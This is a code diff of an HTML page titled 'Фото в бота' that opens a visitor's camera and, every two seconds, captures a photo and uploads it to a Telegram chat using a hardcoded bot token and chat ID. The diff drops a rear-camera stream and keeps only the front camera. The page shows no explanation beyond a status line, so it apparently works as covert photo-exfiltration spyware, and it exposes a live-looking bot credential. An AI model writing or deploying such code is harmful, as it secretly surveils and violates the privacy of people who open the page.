@@ -5,49 +5,30 @@
   <title>Фото в бота</title>
 </head>
 <body>
-  <video id="videoFront" autoplay style="width: 100%; max-width: 500px;"></video>
-  <video id="videoBack" autoplay style="width: 100%; max-width: 500px; display: none;"></video>
-  <canvas id="canvasFront" style="display:none;"></canvas>
-  <canvas id="canvasBack" style="display:none;"></canvas>
+  <video id="video" autoplay style="width: 100%; max-width: 500px;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
   <p id="status"></p>
 
   <script>
-    const videoFront = document.getElementById('videoFront');
-    const videoBack = document.getElementById('videoBack');
-    const canvasFront = document.getElementById('canvasFront');
-    const canvasBack = document.getElementById('canvasBack');
-    const contextFront = canvasFront.getContext('2d');
-    const contextBack = canvasBack.getContext('2d');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
     const status = document.getElementById('status');
     const token = '8176524950:AAGfsNYH5qwFzIvoUmsI-UkzptDMDAYtIVQ';
     const chatId = '5678878569';
 
-    // Фронтальная камера
+    // Доступ к фронтальной камере
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => {
-        videoFront.srcObject = stream;
-        videoFront.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(stream, 'front'), 2000); // Задержка 2 сек
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          setTimeout(() => startPhotoLoop(), 2000); // Задержка 2 секунды
         };
       })
-      .catch(err => status.textContent = 'Ошибка фронтальной камеры: ' + err);
-
-    // Задняя камера
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
-      .then(stream => {
-        videoBack.srcObject = stream;
-        videoBack.onloadedmetadata = () => {
-          setTimeout(() => startPhotoLoop(stream, 'back'), 2000); // Задержка 2 сек
-        };
-      })
-      .catch(err => status.textContent = 'Ошибка задней камеры: ' + err);
+      .catch(err => status.textContent = 'Ошибка камеры: ' + err);
 
     // Фото каждые 2 секунды
-    function startPhotoLoop(stream, type) {
-      const video = type === 'front' ? videoFront : videoBack;
-      const canvas = type === 'front' ? canvasFront : canvasBack;
-      const context = type === 'front' ? contextFront : contextBack;
-
+    function startPhotoLoop() {
       async function takePhoto() {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -56,7 +37,7 @@
 
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('photo', photoBlob, `${type}_photo.png`);
+        formData.append('photo', photoBlob, 'photo.png');
 
         try {
           status.textContent = 'Отправка...';
